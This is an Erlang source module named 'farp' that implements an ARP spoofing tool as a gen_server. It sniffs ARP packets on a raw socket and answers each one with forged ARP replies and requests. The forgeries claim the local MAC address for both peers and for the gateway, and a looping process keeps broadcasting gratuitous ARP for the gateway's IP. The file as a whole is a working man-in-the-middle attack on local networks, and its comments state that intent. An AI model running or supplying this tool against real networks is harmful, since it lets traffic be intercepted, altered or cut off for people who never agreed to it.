%% Copyright (c) 2010, Michael Santos <michael.santos@gmail.com>
%% All rights reserved.
%%
%% Redistribution and use in source and binary forms, with or without
%% modification, are permitted provided that the following conditions
%% are met:
%%
%% Redistributions of source code must retain the above copyright
%% notice, this list of conditions and the following disclaimer.
%%
%% Redistributions in binary form must reproduce the above copyright
%% notice, this list of conditions and the following disclaimer in the
%% documentation and/or other materials provided with the distribution.
%%
%% Neither the name of the author nor the names of its contributors
%% may be used to endorse or promote products derived from this software
%% without specific prior written permission.
%%
%% THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
%% "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
%% LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
%% FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
%% COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
%% INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
%% BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
%% LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
%% CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
%% LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
%% ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
%% POSSIBILITY OF SUCH DAMAGE.
-module(farp).
-behaviour(gen_server).

-define(SERVER, ?MODULE).

-include("epcap_net.hrl").

-export([start/0, start/2, stop/0, spoof/4]).
-export([start_link/2]).
-export([init/1, handle_call/3, handle_cast/2, handle_info/2,
        terminate/2, code_change/3]).


-define(ETHER_BROADCAST, <<16#FF, 16#FF, 16#FF, 16#FF, 16#FF, 16#FF>>).

-record(state, {
        s,              % PF_PACKET socket
        i,              % IF Index
        gwip,           % the gateway IP address
        gwmac,          % the gateway MAC address
        ip,             % our IP address
        mac             % our MAC address
    }).


%%--------------------------------------------------------------------
%%% Exports
%%--------------------------------------------------------------------
start() ->
    [Dev] = packet:default_interface(),
    start(Dev, []).
start(Dev, Opt) ->
    start_link(Dev, Opt).

stop() ->
    gen_server:call(?MODULE, stop).

start_link(Dev, Opt) ->
    gen_server:start_link({local, ?SERVER}, ?MODULE, [Dev, Opt], []).

spoof(Sha, Sip, Tha, Tip) ->
    gen_server:call(?MODULE, {arp, Sha, Sip, Tha, Tip}).


%%--------------------------------------------------------------------
%%% Callbacks
%%--------------------------------------------------------------------
init([Dev, Opt]) ->
    {ok, PL} = inet:ifget(Dev, [addr, hwaddr]),

    IP = proplists:get_value(addr, PL),
    MAC = list_to_binary(proplists:get_value(hwaddr, PL)),
    {ok, {M1,M2,M3,M4,M5,M6}, GWIP} = packet:gateway(Dev),

    {ok, Socket} = packet:socket(?ETH_P_ARP),
    Ifindex = packet:ifindex(Socket, Dev),     

    spawn_link(fun() -> sniff(Socket) end),

    Gratuitous = proplists:get_value(gratuitous, Opt, true),

    % Send a gratuitous arp spoofing the gateway
    case Gratuitous of
        true ->
            spawn_link(fun() -> gateway_arp(Socket, Ifindex, MAC, GWIP) end);
        false ->
            ok
    end,

    {ok, #state{
            s = Socket,
            i = Ifindex,
            ip = IP,
            mac = MAC,
            gwmac = <<M1,M2,M3,M4,M5,M6>>,
            gwip = GWIP
        }}.


handle_call({arp, Sha, Sip, Tha, Tip}, _From, #state{ip = IP, mac = MAC} = State)
    when Sip == IP; Tip == IP; Sha == MAC; Tha == MAC ->
    {reply, ok, State};
handle_call({arp, Sha, Sip, Tha, Tip}, _From, #state{
        mac = MAC,
        gwip = GWIP,
        gwmac = GWMAC
    } = State) ->

    % Inform the source and target that our MAC
    % address is their peer
    ok = send_arp(MAC, Sip, Tha, Tip, State),
    ok = send_arp(MAC, Tip, Sha, Sip, State),

    % Also tell them we are the gateway. Never know,
    % might believe us.
    ok = send_arp(MAC, GWIP, Tha, Tip, State),
    ok = send_arp(MAC, GWIP, Sha, Sip, State),

    % And while we're here, tell the gateway we
    % are in fact the source and target IPs
    ok = send_arp(MAC, Tip, GWMAC, GWIP, State),
    ok = send_arp(MAC, Sip, GWMAC, GWIP, State),

    {reply, ok, State};

handle_call(stop, _From, State) ->
    {stop, shutdown, ok, State}.

handle_cast(_Msg, State) ->
    {noreply, State}.

% WTF?
handle_info(Info, State) ->
    error_logger:error_report([wtf, Info]),
    {noreply, State}.

terminate(_Reason, _State) ->
    ok.

code_change(_OldVsn, State, _Extra) ->
    {ok, State}.


%%--------------------------------------------------------------------
%%% Read ARP packets from the network and send them to the
%%% gen_server
%%--------------------------------------------------------------------
sniff(Socket) ->
    case procket:recvfrom(Socket, 65535) of
        nodata ->
            timer:sleep(10),
            sniff(Socket);
        {ok, Data} ->
            P = epcap_net:decapsulate(Data),
            filter(P),
            sniff(Socket);
        Error ->
            error_logger:error_report(Error)
    end.

% Ignore gratuitous arps
filter([#ether{},
        #arp{sha = Sha, tha = Tha, sip = Sip, tip = Tip},
        _Payload]) when Sha == Tha; Sip == Tip ->
    ok;
filter([#ether{},
        #arp{sha = Sha,
            tha = Tha,
            sip = Sip,
            tip = Tip},
        _Payload]) ->
    spoof(Sha, Sip, Tha, Tip);
filter(_) ->
    ok.


%%--------------------------------------------------------------------
%%% Internal functions
%%--------------------------------------------------------------------

% duplicate MAC errors
% Do not reply to the broadcast
% Avoid spoofing the gateway to the gateway
send_arp(Sha, Sip, Tha, Tip, _) when
    Tha == <<0,0,0,0,0,0>>;
    Tha == <<16#FF,16#FF,16#FF,16#FF,16#FF,16#FF>>;
    Sha == Tha; Sip == Tip -> ok;
send_arp(Sha, Sip, Tha, Tip, #state{s = Socket, i = Ifindex}) ->
    ok = packet:send(Socket, Ifindex,
        make_arp(?ARPOP_REPLY, Sha, Sip, Tha, Tip)),

    ok = packet:send(Socket, Ifindex,
        make_arp(?ARPOP_REQUEST, Sha, Sip, Tha, Tip)).


make_arp(Type, Sha, Sip, Tha, Tip) ->
    Ether = epcap_net:ether(#ether{
            dhost = Tha,
            shost = Sha,
            type = ?ETH_P_ARP
        }),

    Arp = epcap_net:arp(#arp{
            op = Type,
            sha = Sha,
            sip = Sip,
            tha = Tha,
            tip = Tip
        }),

    list_to_binary([Ether, Arp, <<0:128>>]).

gratuitous_arp(Sha, Sip) ->
    make_arp(?ARPOP_REPLY, Sha, Sip, ?ETHER_BROADCAST, Sip).

gateway_arp(Socket, Ifindex, Sha, Sip) ->
    gateway_arp(Socket, Ifindex, Sha, Sip, 0).
gateway_arp(Socket, Ifindex, Sha, Sip, N) ->
    error_logger:info_report([{gratuitous, Sha, Sip}]),
    ok = packet:send(Socket, Ifindex,
        gratuitous_arp(Sha, Sip)),
    Sleep = case N of
        N when N < 4 -> 1000;
        N -> 2000
    end,
    timer:sleep(Sleep),
    gateway_arp(Socket, Ifindex, Sha, Sip, N+1).


